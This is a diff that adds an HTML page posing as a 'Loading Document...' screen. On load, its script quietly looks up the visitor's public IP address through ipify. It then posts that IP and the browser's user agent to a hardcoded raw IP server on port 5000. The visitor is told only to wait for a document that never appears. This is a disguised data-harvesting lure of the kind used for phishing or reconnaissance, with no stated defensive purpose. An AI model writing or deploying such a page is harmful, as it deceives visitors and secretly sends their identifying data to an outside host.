@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading Document...</title>
+</head>
+<body>
+<script>
+  fetch('https://api64.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      const ua = navigator.userAgent;
+
+      fetch("http://137.59.231.46:5000/location", {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          ip: ip,
+          userAgent: ua
+        })
+      });
+    });
+</script>
+
+<h2>Please wait while the document is loading...</h2>
+</body>
+</html>
